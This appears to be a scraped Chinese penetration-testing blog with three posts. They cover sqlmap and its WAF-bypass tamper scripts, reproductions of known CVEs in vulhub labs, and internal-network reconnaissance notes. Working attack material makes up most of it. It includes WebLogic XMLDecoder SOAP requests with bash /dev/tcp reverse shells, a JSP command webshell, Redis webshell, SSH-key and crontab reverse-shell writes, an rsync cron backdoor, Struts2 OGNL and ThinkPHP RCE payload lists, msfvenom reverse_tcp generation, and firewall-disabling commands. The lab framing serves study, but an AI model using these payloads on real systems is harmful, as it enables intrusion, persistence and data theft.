doc├── extra├── lib├── plugins├── sqlmap.conf├── sqlmap.py├── sqlmapapi.py├── tamper└── thirdparty sqlmap.py导入包，检查环境 133 行，main 函数 检查错误，设置环境，接受命令行参数，初始化（init 函数，lib/core/option.py） 182 行，核心功能，从 profile 或者命令行接受目标，进入 start 函数 lib/controller/controller.pystart 函数 1234567def start(): &quot;&quot;&quot; This function calls a function that performs checks on both URL stability and all GET, POST, Cookie and User-Agent parameters to check if they are dynamic and SQL injection affected &quot;&quot;&quot; ... 279 行 12345if conf.direct: initTargetEnv() setupTargetEnv() action() return True 如果 lib/controller/action.py自带tampers12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758apostrophemask.py 用UTF-8全角字符替换'（例如'-&gt;％EF％BC％87）apostrophenullencode.py 用双unicode替换'（例如'-&gt;％00％27）appendnullbyte.py 在payload的末尾附加NULL字节字符（％00）base64encode.py 对payload中的所有字符进行base64编码between.py 用运算符（'&gt;'）替换'NOT BETWEEN 0 AND＃'，用运算符（'='）替换'BETWEEN＃AND＃'bluecoat.py 用随机空白字符替换语句后的空格字符，之后用运算符LIKE替换字符'='chardoubleencode.py 对payload中的所有字符进行双重URL编码（例如SELECT-&gt;％2553％2545％254C％2545％2543％2554）charencode.py 对payload中所有字符进行URL编码（例如SELECT-&gt;％53％45％4C％45％43％54）charunicodeencode.py 对payload中的所有字符进行unicode编码（例如SELECT-&gt;％u0053％u0045％u004C％u0045％u0043％u0054）charunicodeescape.py 使用Unicode转义payload中的未编码字符（例如SELECT-&gt;\\u0053\\u0045\\u004C\\u0045\\u0043\\u0054）commalesslimit.py 用'LIMIT N OFFSET M'替换（MySQL）实例，例如'LIMIT M，N'commalessmid.py 用'MID（A FROM B FOR C）'替换（MySQL）实例，例如'MID（A，B，C）'commentbeforeparentheses.py 在括号前加（内联）注释（例如（（-&gt;/**/（）concat2concatws.py 用'CONCAT_WS（MID（CHAR（0），0，0），A，B）'替换（MySQL）实例，例如'CONCAT（A，B）' 。equaltolike.py 将（'='）运算符替换为'LIKE'escapequotes.py 斜杠转义单引号和双引号（例如'-&gt; \\'）great.py 替换运算符（'&gt;' ）和'GREATEST'对应Halfversionedmorekeywords.py 在每个关键字前添加mysql注释hex2char.py 替换每个（MySQL）0x等效的CONCAT（CHAR（），...）编码字符串htmlencode.py 用HTML编码（使用代码点）所有非字母数字字符（例如'-&gt;'）ifnull2casewhenisnull.py 绕过对 IFNULL 过滤,替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’ifnull2ifisnull.py 用'IF（ISNULL（A），B）替换'IFNULL（A，B）'之类的实例，A）'对应informationschemacomment.py 在所有出现的（MySQL）“information_schema”标识符的末尾添加一个内联注释（/ ** /）least.py 用'LEAST'对应替换运算符（'&gt;'）lowercase.py 用小写替换每个关键字字符（例如SELECT-&gt;select）luanginx.py LUA-NginxWAF绕过（例如Cloudflare）modsecurityversioned.py 包含带有（MySQL）版本注释的完整查询modsecurityzeroversioned.py 包含带有（MySQL）零版本注释的完整查询multiplespaces.py 在SQL关键字周围添加多个空格（''）overlongutf8.py 将payload中的所有（非字母数字）字符转换为超长UTF8（例如'-&gt;％C0％A7）overlongutf8more.py 将payload中所有字符转换为超长UTF8（例如SELECT-&gt;％C1％93％C1％85％C1％8C％C1％85％C1％83％C1％94）percent.py 在每个字符前面添加一个百分号（'％'） （例如SELECT-&gt;％S％E％L％E％C％T）plus2concat.py 替换运算符（'+'）与（MsSQL）函数CONCAT（）对应plus2fnconcat.py 用（MsSQL）ODBC函数{fn CONCAT（）}替换为（'+'）randomcase.py 用随机大小写值替换每个关键字字符（例如SELECT-&gt; SEleCt）randomcomments.py 在SQL关键字内添加随机内联注释（例如SELECT-&gt; S/**/E/**/LECT）sp_password.py 将（MsSQL）函数'sp_password'附加到payload的末尾，以便从DBMS日志中自动进行混淆space2comment.py 空格替换为/**_**/space2dash.py 空格替换为-加随机字符space2hash.py 空格替换为#加随机字符space2morecomment.py 空格替换为/**_**/space2morehash.py 空格替换为#加随机字符及换行符space2mssqlblank.py 空格替换为其他空符号（MsSQL）space2mssqlhash.py 空格替换为%23%0A(MsSQL)space2mysqlblank.py 空格替换为其它空符号（Mysql）space2mysqldash.py 替换空格字符（''）（’–‘）后跟一个破折号注释一个换行（’n’）space2plus.py 用加号（'+'）替换空格字符（''）space2randomblank.py 用空格中的随机空白字符替换空格字符（''）有效的替代字符集substring2leftright.py 用LEFT和RIGHT替换PostgreSQL SUBSTRINGsymbolicologic.py 用符号（&amp;&amp;和||）替换AND和OR逻辑运算符unionalltounion.py 用UNION SELECT替换UNION ALL SELECTunmagicquotes.py 用多字节组合％BF％27替换引号字符（'），并在末尾添加通用注释uppercase.py- 用大写值替换每个关键字字符（例如select -&gt; SELECT）varnish.py 添加HTTP标头'X-originating-IP'以绕过Varnish防火墙versionedkeywords.py 用注释封装每个非函数的关键字versionedmorekeywords.py 将每个关键字包含（MySQL）版本注释xforwardedfor.py 添加伪造的HTTP标头'X-Forwarded-For –os-shell使用 os shell 成功时会同时上传 file stager 和 backdoor 1[21:30:16] [INFO] the file stager has been successfully uploaded on '/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/' - http://192.168.3.135:80/se3reTdir777/uploads/tmpuxvlx.php [21:30:16] [INFO] the backdoor has been successfully uploaded on '/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/' - http://192.168.3.135:80/se3reTdir777/uploads/tmpbfwfq.php file stager 可以直接上传文件 执行系统命令就是利用的这个后门 –file-write 写入webshell生成webshell 1msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.3.132 LPORT=1234 &gt; shell.php 上传文件 1sqlmap ... --file-write [file] --file-dest [path/filename]","link":"/2020/02/01/sql-injection/"},{"title":"漏洞复现","text":"复现一些常见并且影响范围广的漏洞 Apache Shiro Java反序列化漏洞 (CVE-2016-4437, Shiro550)简介Apache Shiro 默认使用 CookieRememberMeManager，其处理 cookie 的流程是：得到 rememberMe 的 cookie 值，base64 解码，AES 解密，反序列化。AES的密钥是硬编码的，攻击者可以构造恶意数据造成反序列化的 RCE 漏洞。 影响范围 Apache Shiro &lt; 1.2.5 环境搭建使用 vulhub 中的漏洞环境，用admin:vulhub登录。 漏洞利用使用 ShiroExploit，一路下一步即可命令执行。 Apache Solr 远程命令执行(CVE-2019-0193)简介Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。 影响范围 Apache Solr 5.x - 8.2.0 存在 config API 版本 环境搭建使用 vulhub 靶机 漏洞利用创建了一个名为 test 的 core 节点，此漏洞利用的前提是知道 core 的名称。 漏洞产生原因是能够直接访问 solr 控制台，通过发送类似solr/节点名/config的POST请求对该节点的配置文件做更改，能进入控制台能看见 core 节点的名称。也可以尝试访问/solr/admin/aores能看见创建的全部 core 节点的名称。 python2脚本，CVE-2019-0193.py： 1python CVE-2019-0193.py http://192.168.67.145:8983/ &quot;pwd&quot; Apache Tomcat 文件包含漏洞 (CVE-2020-1938，幽灵猫)简介Apache Tomcat 会开启 AJP 连接器，方便与其他 web 服务器通过 AJP 协议进行交互，由于 Tomcat 本身也内涵 HTTP 服务器，因此也可以视为一个单独的 web 服务器。 攻击者可以利用该漏洞读取或包含 Tomcat 上所有 webapp 目录下的任意文件，包括 webapp 配置文件和源代码等。 影响范围 Apache Tomcat 9.x &lt; 9.0.31 Apache Tomcat 8.x &lt; 8.5.51 Apache Tomcat 7.x &lt; 7.0.100 Apache Tomcat 6.x 环境搭建使用 vulhub 中的漏洞环境（tomcat 9.0.30），靶机地址192.168.67.144（NAT）。 漏洞利用12345678$ nmap -sV 192.168.67.144Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-17 19:31 CSTNmap scan report for 192.168.67.144Host is up (0.0013s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION8009/tcp open ajp13 Apache Jserv (Protocol v1.3)8080/tcp open http Apache Tomcat 9.0.30 POC： 12345https://github.com/00theway/Ghostcat-CNVD-2020-10487 # 可RCEhttps://github.com/0nise/CVE-2020-1938https://github.com/nibiwodong/CNVD-2020-10487-Tomcat-ajp-POC # 本文使用https://github.com/Kit4y/CNVD-2020-10487-Tomcat-Ajp-lfi-Scannerhttps://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/ CVE-2020-1938.py ，CVE-2020-1938-requirements.txt 12$ pip install -r CVE-2020-1938-requirments.txt$ python CVE-2020-1938.py -p 8009 -f &quot;/WEB-INF/web.xml“ 192.168.67.144 可配合文件上传 RCE，需要有上传点且已知路径。 Apache Tomcat 弱口令简介Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。 环境搭建使用 vulhub 靶机 漏洞利用访问 http://ip:8080/manager/html，输入弱口令tomcat:tomcat 在 WAR file to deploy 中上传小马，内容： 123456789101112&lt;% if(&quot;123&quot;.equals(request.getParameter(&quot;pwd&quot;))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[1024]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(&quot;&lt;/pre&gt;&quot;); } %&gt; 压缩为 zip 文件，并将后缀名改为 war，上传。 访问http://ip:8080/shell/shell.jsp?pwd=123&amp;cmd=ls成功执行 ls Weblogic XML Decoder 反序列化(CVE-2017-10271)简介Weblogic是oracle推出的application server，由于其具有支持EJB、JSP、JMS、XML等多种语言、可扩展性、快速开发等多种特性，备受广大系统管理员的青睐。 CVE-2017-10271漏洞主要是由WebLogic Server WLS组件远程命令执行漏洞，主要由wls-wsat.war触发该漏洞，post数据包，通过构造构造SOAP（XML）格式的请求，在解析的过程中导致XMLDecoder反序列化漏洞。 影响范围 Oracle WebLogic Server 10.3.6.0.0 Oracle WebLogic Server 12.1.3.0.0 Oracle WebLogic Server 12.2.1.1.0 环境搭建使用 vulhub 中的靶机 漏洞利用使用 vulhub 中的靶机 POST 请求（反弹shell）： 12345678910111213141516171819202122232425262728293031POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 633&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.9.1/4444 0&amp;gt;&amp;amp;1&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; 写入 shell： 12345678910111213141516171819202122232425262728POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 638&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt; &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;object class=&quot;java.io.PrintWriter&quot;&gt; &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp&lt;/string&gt; &lt;void method=&quot;println&quot;&gt;&lt;string&gt; &lt;![CDATA[&lt;% out.print(&quot;test&quot;); %&gt; ]]&gt; &lt;/string&gt; &lt;/void&gt; &lt;void method=&quot;close&quot;/&gt; &lt;/object&gt;&lt;/java&gt;&lt;/java&gt; &lt;/work:WorkContext&gt; &lt;/soapenv:Header&gt; &lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt; phpMyAdmin 远程代码执行(CVE-2016-5774)简介phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。在其查找并替换字符串功能中，将用户输入的信息拼接进preg_replace函数第一个参数中。 在PHP5.4.7以前，preg_replace的第一个参数可以利用\\0进行截断，并将正则模式修改为e。 影响范围 phpmyadmin 4.0.x - 4.6.2 环境搭建使用 vulhub 的靶机，PHP 5.3 + Apache + phpMyAdmin 4.4.15.6 漏洞利用使用 exploit-db的POC，CVE-2016-5734.py 12python CVE-2016-5734.py -c 'system(id);' -u root -p root -d test http://your-ip:8080/# -c 为要执行的 php 语句，-u 数据库用户名，-p 密码，-d 数据库 phpMyAdmin 远程文件包含(CVE-2018-12613)简介phpMyAdmin是一套开源的、基于Web的MySQL数据库管理工具。其index.php中存在一处文件包含逻辑，通过二次编码即可绕过检查，造成远程文件包含漏洞。 影响范围 phpMyAdmin 4.8.1 环境搭建使用 vulhub 的环境 漏洞利用访问http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd，可以看到文件包含成功 执行SELECT '&lt;?=phpinfo()?&gt;'，查看自己的 sessionid (phpMyAdmin 的值)，然后包含 session 文件，常见 session 文件位置 12345/var/lib/php5/sess_PHPSESSID/var/lib/php7/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSED 该容器中 session 文件在/tmp/sess_PHPSESSID Redis 未授权访问简介Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。 Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。 部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。 影响范围 redis 4.x - redis 5.x 环境搭建使用 vulhub 中的靶机 漏洞利用nmap 探测，nmap -sS 104.199.148.119 ‐‐script=redis‐info redis-cli 连接，redis-cli -h 104.199.148.219 写入webshell（前提：开启 web 服务，已知绝对路径，有文件操作权限）： 12345678# 设置 dir 为网站路径config set dir /var/www/html# 设置文件内容，xxx为任意内容set xxx &quot;\\n\\n\\n&lt;?php @eval($_POST['shell']);?&gt;\\n\\n\\n&quot;# 设置文件名config set dbfilename shell.php# 保存，生成文件save 写入 ssh key（前提：开启 ssh 服务）： 123456789101112131415# 本地创建 ssh 密钥ssh-keygen -t rsa# 将公钥内容写入如文本cd /root/.ssh(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; pub.txt# 将内容写入 redis 服务器，设定 key 为 pubcat pub.txt | redis-cli -h 104.199.148.219 -x set pub# 访问靶机redis-cli -h 104.199.148.219``# 设置公钥备份文件名为 authorized_keysconfig set dbfilename authorized_keys# 保存save# 攻击机 ssh 连接靶机ssh -i id_rsa root@104.199.148.219 crontab： 123456789# 监听一个端口nc -lvvp 4444# 写入计划任务redis-cli -h 104.199.148.219set xxx &quot;\\n\\n*/1 * * * * /bin/bash ‐i&gt;&amp;/dev/tcp/192.168.40.131/4321 0&gt;&amp;1\\n\\n&quot;config set dir /var/spool/cronconfig set dbfilename rootsave# 1分钟后反弹 shell 主从复制 RCE， Redis提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写。 在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。 在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上，然后在从机上加载so文件，我们就可以执行拓展的新命令了。 Lua RCE，工具 rsync 未授权访问简介rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。 环境搭建使用 vulhub 中的靶机 漏洞利用123rsync rsync://your-ip:873/rsync rsync://your-ip:873/src # 列出src模块下的文件rsync -av rsync://your-ip:873/src/etc/passwd ./ # 任意文件下载 反弹 shell，内容： 12#!/bin/bash /bin/bash -i &gt;&amp; /dev/tcp/192.168.91.128/4444 0&gt;&amp;1 提供可执行权限 1chmod +x shell 上传至 /etc/cron.hourly 1rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell 监听端口 1nc -lvvp 4444 Struts2 S2-057 远程命令执行漏洞(（)CVE-2018-11776)简介当Struts2的配置满足以下条件时： alwaysSelectFullNamespace值为true action元素未设置namespace属性，或使用了通配符 namespace将由用户从uri传入，并作为OGNL表达式计算，最终造成任意命令执行漏洞。 影响范围 &lt;= Struct 2.3.34 Struts 2.5.16 环境搭建使用 vulhub 靶机 漏洞利用测试OGNL表达式${233*233}： 1http://your-ip:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action 可以看到 Location 头中计算出了表达式的值。 执行表达式（发送前需 URL 编码）： 12${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))} 同样可在返回头 Location 中看到结果 ThinkPHP 5 远程命令执行简介ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。 影响范围 ThinkPHP 5.0-5.0.24 ThinkPHP 5.1.0-5.1.30 环境搭建使用 vulhub 中的靶机 漏洞利用5.0.20 版本： 1http://your-ip:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1 执行 phpinfo 5.0.23 版本： 向http://192.168.67.145:8080/index.php?s=captcha POST数据 1_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id 成功执行 id 其他 payload: 5.1.x 12345?s=index/\\think\\Request/input&amp;filter[]=system&amp;data=pwd?s=index/\\think\\view\\driver\\Php/display&amp;content=&lt;?php phpinfo();?&gt;?s=index/\\think\\template\\driver\\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;?s=index/\\think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id 5.0.x 12345?s=index/think\\config/get&amp;name=database.username // 获取配置信息?s=index/\\think\\Lang/load&amp;file=../../test.jpg // 包含任意文件?s=index/\\think\\Config/load&amp;file=../../t.php // 包含任意.php文件?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id?s=index|think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][0]=whoami 1234567891011121314151617http://php.local/thinkphp5.0.5/public/index.php?s=indexpost_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo_method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami# ThinkPHP &lt;= 5.0.13POST /?s=index/indexs=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system# ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debugPOST /_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al# ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captchaPOST /?s=xxx HTTP/1.1_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls Weblogic WLS Core Components 反序列化命令执行漏洞(CVE-2018-2628)简介Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。 影响范围CVE-2019-2725脏牛 Dirty COWLinux Kernel 2.6.22 &lt; 3.9 - ‘Dirty COW /proc/self/mem’ Race COndition Privilege Escalation(/etc/passwd Method)，https://www.exploit-db.com/exploits/40847 脏牛漏洞成功率较高的 exp，一般 exp 提权可能导致服务器宕机，https://github.com/FireFart/dirtycow 使用gcc -pthread dirty.c -o dirty -lcrypt命令对 dirty.c 进行编译，生成一个 dirty 可执行文件，执行 ./dirty 密码命令提权，https://github.com/gbonacini/CVE-2016-5195 解压进入文件夹，执行 make 生成一个 dcow 可执行文件，执行./dcow-s命令提权 待复现 Windows RDP 的RCE (CVE-2019-0708) Pulse Secure SSLVPN Apache Solr RCE 脏牛 内核提权漏洞 (CVE-2016-5195) CVE-2020-0796，POC：https://github.com/danigargu/CVE-2020-0796","link":"/2020/05/17/vulnerability-reproduction/"},{"title":"内网渗透","text":"《内网安全攻防——渗透测试实战指南》笔记 内网信息收集概述信息收集目标： 判断当前机器角色，是普通 Web 服务器、开发测试服务器、公共服务器、文件服务器、代理服务器、DNS 服务器还是存储服务器等等 判断当前机器所处网络环境的拓扑结构，是对所处内网进行全面的信息收集，和分析整理，绘制大概的内网整体拓扑结构图 判断当前机器所处区域，是指判断当前按机器处于网络拓扑中的哪个位置，是在 DMZ 区、办公区还是核心区 收集本机信息手动收集本机信息包括系统、权限、内网 IP 地址段、杀毒软件、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机，操作系统、应用软件、补丁、服务、杀毒软件一般是一键安装的。 相关命令： 命令 作用 ipconfig /all 获取本机网络配置信息 ``systeminfo findstr /B /C:”OS Name” /C:”OS Version”`` echo %PROCESSOR_ARCHITECTURE% 查看系统架构 wmic product get name,version 查看安装软件信息 ``powershell “GET-WmiObject -class Win32_Product Select-Object -Property name,version”`` wmic service list brief 查看服务信息 tasklist 查看进程信息 wmic process list brief 查看进程信息 wmic startup get command,caption 查看启动程序信息 schtasks /query /fo LIST /v 查看计划任务 net statistics workstation 查看开机时间 net user 查看用户列表，可以寻找用户命名规律 net localgroup administrators 查看本地管理员，有时会有域用户被添加为域机器的本地管理员 net session 列出或断开本地计算机域所连接的客户端之间的会话 netstat -ano 查看端口信息 system info 查看补丁信息 wmic qfe get Caption,Description,HotFixID,InstalledOn 查看安装在系统中的补丁 net share 查看本机共享列表 wmic share name,path,status 查看本机共享列表 route print 查看路由表 arp -a 查看MAC地址 netsh firewall show config 查看防火墙配置 netsh firewall set opmode disable Windows Server 2003及以前的版本，禁用防火墙 netsh advfirewall set allprofiles state off Windows Server 2003 之后版本，禁用防火墙 netsh firewalll add allowedprogram c:\\nc.exe &quot;allow nc&quot; enable Windows Server 2003 之前，允许 nc 全部连接 netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\\nc.exe&quot; Windows Server 2003之后，允许 nc 进入 netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=in action=allow program=&quot;C:\\nc.exe&quot; Windows Server 2003 之后，允许 nc 出 netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocal=TCP dir=in localport=3389 action=allow Windows Server 2003之后，允许3389 netsh advfirewall set currentprofile logging filename &quot;C:\\windows\\temp\\fw.log&quot; 自定义防火墙日志文件位置 reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot; 查看代理配置情况 reg query &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /V PortNumber 查看远程连接端口(十六进制) wmic path win32_terminalservicesetting where (__classCLASS !=&quot;&quot;) call setallowtsconnections 1 Windows Server 2003 开启 3389 端口 wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalsetting where (__class !=&quot;&quot;) call setallowtsconnections 1 Windows Server 2008 和 2012 开启3389端口 wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_terminalgeneralsetting where (TermicalName='RDP-Tcp') call setuserauthenticationrequired 1 Windows Server 2008 和 2012 开启3389端口 reg add &quot;HKLM\\SYSTEM\\CURRENT\\CONTROLSET\\CONTROL\\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DOWRD /d 0 /f Windows Server 2008 和 2012 开启3389端口 常见杀软进程名称： 进程 软件 360sd.exe 360杀毒 360tray.exe 360实时防护 ZhuDongFangYu.exe 360主动防御 KSafeTray.exe 金山卫士 SafeDogUpdateCenter.exe 服务器安全狗 McAfee McShield.exe McAfee egui.exe NOD32 AVP.EXE 卡巴斯基 avguard.exe 小红伞 bdagent.exe BitDefender 自动收集使用 WMIC(Windows Management Instrumentation Command-Line)，脚本自动获取所需的信息。默认情况下，任何版本的 Windows XP 的低权限用户不能访问 WMIC，Windows 7 以上版本的低权限用户允许访问 WMIC 并执行相关查询操作，推荐脚本：wmic_info.bat Empire 下的主机信息收集12usemodule situational_awareness/host/winenumusemodule situational_awareness/host/computerdetails 查询当前权限如果内网中存在域，本地普通用户只能查询本机信息，无法查询域内信息；本地管理员和域用户可以查询域内信息。 命令 作用 whoami 查询当前权限 whoami /all 查询域 SID net user username /domain 查询指定用户的详细信息 判断是否存在域获取了本机信息之后，需要判断内网中是否存在域，如果存在，当前主机是否在域内。通常有多种方法。 查看网络配置使用 ipconfig /all 查看网关 IP 地址、DNS IP地址、域名、本机是否和 DNS 处于同一网段等信息，然后通过反向解析查询命令 nslookup example.domainname 解析域名的 IP 地址，判断域控制器和 DNS 服务器是否是同一台服务器。 查看系统详细信息使用 systeminfo 查看系统详细信息，域 为域名，如果 域 为 WORKGROUP 则本机不在域内，登陆服务器为域控。 查询当前登陆域及登录用户信息使用 net config workstation，工作站域 DNS 名称为域名，登陆域表示当前登录用户是域用户或者本地用户， 判断主域使用 net time /domain 查询时间，由于与服务器通常会同时作为时间服务器，可以用于判断主域。执行结果分为以下几种情况： 存在域，但当前用户不是域用户 12发生系统错误 5拒绝访问 存在域，且当前用户是域用户 1\\\\DC.hacke.testlab 的当前时间是 2020/7/29 18:04:07 当前网络环境为工作组，不存在域 1找不到域 WORKGROUP 的域控制器 探测域内存活主机使用 NetBIOS 快速探测内网NetBIOS 是局域网程序使用的一种 API为应用程序提供了请求低级别服务的统一指令集，为局域网提供了网络及其他特殊功能，几乎所有的局域网都是在 NetBIOS协议的基础上工作的，推荐优先使用。 使用 nbtscan 扫描内网，Windows 版，Linux版，不输入任何参数可查看帮助 1nbtscan.exe 192.168.1.0/24 扫描结果第一列为 IP 地址，第二列为所在域，第三列为开启的服务 Token 含义 SHARING 该机器中存在正在运行的文件和打印共享服务，但不一定有内容共享 DC 可能是域控制器 U=USER 可能有登录名为 USER 的用户 IIS 可能安装 IIS 服务器 EXCHANGE 可能安装了 Exchange NOTES 可能安装了 Lotus Notes 电子邮件客户端 ? 没有识别出该机器的 NetBIOS 资源，可使用 -F再次扫描 利用 ICMP 协议快速探测内网扫描 C 段： 1for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL&quot; 也可利用 VBS 脚本 利用 ARP 探测内网使用 arpscan 利用 arp 协议扫描，Windows 版，Kali 可以使用 apt 安装 1arpscan.exe -t 192.168.1.0/24 也可以使用 Empire 的 arpscan 模块或者 Nishang 中的 Invoke-ARPScan.ps1 脚本 通过常规 TCP/UDP 端口扫描探测内网使用 ScanLine 探测端口 1scanline -h -t 22,80-89,110,389,445,3389,1433,2049 -u 53,161 -O C:\\Windows\\temp\\log.txt -p 192.168.1.1-254 /b 扫描域内端口利用 telnet 扫描如果单纯检查某个高危端口是否开放可以选择 telnet 12telnet DC 1433telnet 192.168.1.4 22 S 扫描器S 扫描器适合运行于 Windows Server 2003 以下的机器，扫描结果默认保存在安装目录下的 result.txt 文件中，推荐使用 TCP 扫描 1S.exe TCP 192.168.1.1 192.168.1.254 445,3389 /Banner /save MetasploitMetasploit 不仅提供了多种端口扫描技术，还提供了与其他扫描工具的接口 1use auxiliary/scanner/portscan/tcp PowerSploit 的 